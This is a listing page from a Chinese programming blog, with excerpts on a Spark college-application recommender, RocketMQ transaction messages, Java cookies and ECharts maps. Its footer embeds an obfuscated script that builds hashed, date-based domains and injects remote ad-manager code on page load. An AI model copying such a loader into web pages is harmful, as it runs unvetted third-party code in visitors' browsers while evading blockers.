用户在电脑中使用系统时，需要进行登录，在该界面输入对应的账号和密码，并需要填写正确，点击提交以后，系统将会根据用户提交的账号和密码与自己的数据库中相应的数据进行比对，数据反馈给了系统，系统做出了判定，并提示登陆成功，才能进入到系统的首页中。该基于Spark的高考志愿推荐系统如图5-1所示：
图5-1登录界面
5.2系统首页
该模块主要是对系统的一些高考志愿推荐进行展示。在该基于Spark的高考志愿推荐系统中的首页模块界面如图5-2所示：
图5-2系统首页界面
5.3管理员界面 该高考志愿推荐系统的管理员界面如图5-3所示：
图5-3管理员界面
管理员点击高考志愿管理，可以进行相应界面的查看，并根据需要对详情信息进行详情、修改或删除操作；如图5-4所示：
图5-4高考志愿管理界面
注：展示部分文档内容和系统截图，需要完整的视频、代码、文章和安装调试环境请私信up主。
目录
摘要 Ⅰ
ABSTRACT Ⅱ
第一章绪论 1.1系统开发的背景 1.2研究意义 1.3研究内容 1.4论文结构 1.5本章小结 第二章系统的开发环境及相关技术介绍 2.1系统的开发环境 2.2系统的开发语言 2.3 Spark框架介绍 2.4系统所使用的数据库 2.5系统所使用的技术 2.6本章小结 第三章系统分析 3.1系统的可行性分析 3.1.2经济可行性 3.1.3技术可行性 3.1.4社会可行性 3.2系统性能需求分析 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/911a04ccd0f21ead8ef942efb406b5b3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/621c6f9960810858599380d6aedf999a/" rel="bookmark">
			RocketMQ系列6——事务消息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RocketMQ在4.3.0版中支持分布式事务消息，这里RocketMQ的事务消息是采用2PC(两段式协议) +补偿机制（消息回查）的分布式事务功能。提供消息发送与业务落库的一致性。
一、事务流程 流程主要分为两个阶段：正常事务消息的发送及提交、事务消息的补偿流程。
1.事务消息发送及提交：
(1) 生产者发送半事物消息到消息队列服务端。
(2) 消息队列服务端将消息持久化成功之后，返回Ack的确认发送成功的消息。也就是半事物消息发送成功。
(3) 根据发送结果执行本地事务（如果写入失败，此时half消息对业务不可见，本地逻辑不执行）相关逻辑。
(4) 生产者根据本地事务状态结果向消息队列服务端提交二次确认结果，执行Commit（Commit操作服务端把半事物消息标记为可投递，并投递给消费者）或者Rollback（服务端把事物回滚，不会将半事务的消息投递给消费者）。
2.事务消息的补偿流程：
(5)对于没有Commit/Rollback的事务消息，经过国定的时间后，服务端会对消息生产者发起消息回查。
(6) Producer收到回查消息，检查回查消息对应的本地事务的状态。
(7) 根据本地事务状态，重新Commit或者Rollback。
半事务消息：暂时不能投递，生产者已经把消息放到了服务端。但是MQ没有收到生产者的二次确认，标记为"暂不能投递状态"，属于半事务消息。
消息回查：网络中断，生产者重启，导致某个事务消息的二次确认丢失，mq查询到某条消息长期处于“暂不能投递状态”，查询生产者这个消息的最终状态(回滚或提交)，询问过程叫消息回查。
二、事务消息设计 1.半事物消息对用户不可见原理 half（半事物）消息，需要备份原消息的主题与消息消费队列，之后改变Topic名字为RMQ_SYS_TRANS_HALF_TOPIC。由于没有消费组订阅这个topic，所以消费端不会消费half类型的消息。RocketMQ中消息的服务端存储结构，Consumer通过ConsumeQueue这个二级索引来读取消息实体内容(commitLog)。
RocketMQ的具体实现策略:如果写入的是事务消息，对消息的Topic和Queue等属性进行替换，将原来的Topic和Queue信息存储到消息属性中。然后RocketMQ会开启一个定时任务，从Topic为RMQ_SYS_TRANS_HALF_TOPIC中拉取消息进行消费，根据生产者组获取一个服务提供者发送回查事务状态的请求，根据事务状态决定是提交或者回滚消息。改变主题名称和延迟队列实现策略差不多。
2.Commit和Rollback操作和Op消息 提交完成半事物消息之后，下一步如果是Rollback操作，需要撤销（由于RocketMq是顺序写入的，撤销不是真正的把这条消息删除）半事物消息，需要一个操作来标识这条消息的最终状态。RocketMQ事务消息引入了Op消息的概念，用Op消息标识事务消息已经确定的状态(Commit或Rollback)。如果一个事务没有对应的Op消息，说明这个事务的状态还没有到达最终状态，就是二阶段还没有最终结果。下一步如果是Commit操作，需要让消息对消费者可见，Commit相对于Rollback只是在写入Op消息前创建Half消息的索引。
3.Op消息的存储和对应关系 RocketMQ将Op消息写入到全局一个特定的Topic中(源码位置TransactionalMessageUtil.buildOpTopic())，这个Topic是一个内部Topic不会被用户消费。Op消息的内容为对应的Half消息的存储的Offset，通过Op消息能索引到Half消息进行后续的回查操作。
4.Half消息的索引构建 执行Commit操作时，需要创建Half消息的索引。开始Half消息写入了一个特殊的Topic为RMQ_SYS_TRANS_HALF_TOPIC中，需要读取出来Half消息，并将Topic和Queue替换成真正的目标的Topic和Queue，之后写入到目标Topic生成一条对用户可见的消息。就相当于RocketMQ事务消息在Commit阶段，使用了Half消息存储的消息内容，在Commit阶段是恢复出完成的一条普通消息，走一边写入的流程。
5.处理二阶段失败的消息 如果在RocketMQ事务消息的二阶段过程中失败了，比如Commit操作失败，出现网络问题之类的，需要通过补偿策略使这条消息最终被Commit。RocketMQ采用了一种补偿的机制“回查”。Broker端对于未确定状态的消息，在Broker配置文件中的参数transactionTimeout配置的特定时间长度之后发起回查，将消息发送到对应的Producer端，由Producer根据消息来检查本地事务的状态，之后在执行Commit或Rollback。Broker端根据Half消息和Op消息进行事务消息的回查并且记录那些事务消息的状态是确定的。RocketMQ默认回查15次（为了避免单个消息被检查太多次而导致半队列消息累积），可以通过Broker配置文件的transactionCheckMax参数修改，如果超过15次还没有获取到事务状态，默认回滚消息。
三、事务消息使用上的限制 事务消息不支持延时消息和批量消息。为了避免单个消息被检查太多次而导致半队列消息累积，我们默认将单个消息的检查次数限制为 15 次，但是用户可以通过 Broker 配置文件的transactionCheckMax参数来修改此限制。如果已经检查某条消息超过 N 次的话（ N =transactionCheckMax） 则 Broker 将丢弃此消息，并在默认情况下同时打印错误日志。用户可以通过重写AbstractTransactionalMessageCheckListener类来修改这个行为。事务消息将在 Broker 配置文件中的参数 transactionTimeout 这样的特定时间长度之后被检查。当发送事务消息时，用户还可以通过设置用户属性 CHECK_IMMUNITY_TIME_IN_SECONDS 来改变这个限制，该参数优先于transactionTimeout参数。事务性消息可能不止一次被检查或消费。提交给用户的目标主题消息可能会失败，目前这依日志的记录而定。它的高可用性通过 RocketMQ 本身的高可用性机制来保证，如果希望确保事务消息不丢失、并且事务完整性得到保证，建议使用同步的双重写入机制。事务消息的生产者 ID 不能与其他类型消息的生产者 ID 共享。与其他类型的消息不同，事务消息允许反向查询、MQ服务器能通过它们的生产者 ID 查询到消费者。 四、事务java代码示例 //演示demo，模拟订单表查询服务，用来确认订单事务是否提交成功。 private static boolean checkOrderById(String orderId) { return true; } //演示demo，模拟本地事务的执行结果。 private static boolean doLocalTransaction() { return true; } public static void main(String[] args) throws ClientException { ClientServiceProvider provider = new ClientServiceProvider(); MessageBuilder messageBuilder = new MessageBuilder(); //构造事务生产者：事务消息需要生产者构建一个事务检查器，用于检查确认异常半事务的中间状态。 Producer producer = provider.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/621c6f9960810858599380d6aedf999a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62e34f5063f175e037c6377c04c1ed71/" rel="bookmark">
			Cookie浅谈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 概念：客户端会话技术，将数据保存到客户端快速入门： 使用步骤： 创建Cookie对象，绑定数据 new Cookie(String name, String value) 发送Cookie对象 response.addCookie(Cookie cookie) 获取Cookie，拿到数据 Cookie[] request.getCookies() 实现原理 基于响应头set-cookie和请求头cookie实现 cookie的细节 一次可不可以发送多个cookie? 可以可以创建多个Cookie对象，使用response调用多次addCookie方法发送cookie即可。 cookie在浏览器中保存多长时间？ 默认情况下，当浏览器关闭后，Cookie数据被销毁持久化存储： setMaxAge(int seconds) 正数：将Cookie数据写到硬盘的文件中。持久化存储。并指定cookie存活时
间，时间到后，cookie文件自动失效负数：默认值零：删除cookie信息 cookie能不能存中文？ 在tomcat 8 之前 cookie中不能直接存储中文数据。 需要将中文数据转码—一般采用URL编码(%E3) 在tomcat 8 之后，cookie支持中文数据。特殊字符还是不支持，建议使用URL编码存储，
URL解码解析 ，方式为：URLEncoder.encode（string str）
URLDecoder.decode (string str) cookie共享问题？ 假设在一个tomcat服务器中，部署了多个web项目，那么在这些web项目中cookie能不能
共享？ 默认情况下cookie不能共享setPath(String path):设置cookie的获取范围。默认情况下，设置当前的虚拟目录 如果要共享，则可以将path设置为"/" 不同的tomcat服务器间cookie共享问题？ setDomain(String path):如果设置一级域名相同，那么多个服务器之间cookie可以共享 setDomain(“.baidu.com”),那么tieba.baidu.com和news.baidu.com中cookie可以
共享 Cookie的特点和作用 cookie存储数据在客户端浏览器浏览器对于单个cookie 的大小有限制(4kb) 以及 对同一个域名下的总cookie数量也有限制(20 个) 作用： cookie一般用于存储少量的不太敏感的数据在不登录的情况下，完成服务器对客户端的身份识别 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a79f131c700cadf9a7ad5db66d600df/" rel="bookmark">
			echarts中国地图使用整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、echarts中国地图使用案例
1.准备地图数据china.json ; 需要的添加微信：tianma104，我发你
2.引入jquery，引入eachars 库
&lt;script src="http://xx/ajax/libs/jquery/3.5.1/jquery.min.js"&gt;&lt;/script&gt; &lt;script src="https://xxx/ajax/libs/echarts/5.0.0-rc.1/echarts.min.js"&gt;&lt;/script&gt; 3.编写js代码
&lt;div id="mapchart" style="width:800px;height:800px;"&gt;&lt;/div&gt; &lt;script&gt; $.ajax({ url: "china.json", type: "get", dataType: "json", success: function (chinaJson) { echarts.registerMap("china", chinaJson); mapchar = echarts.init(document.getElementById("mapchart")); var option = { title: { text: "会员分布图", textStyle: { fontSize: 15 }, left: "center" }, tooltip: { trigger: "item" }, legend: { orient: "vertical", left: "left", data: ["会员"] }, visualMap: { min: 0, max: 1000, itemWidth: 10, itemHeight: 50, left: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a79f131c700cadf9a7ad5db66d600df/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/126/">«</a>
	<span class="pagination__item pagination__item--current">127/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/128/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>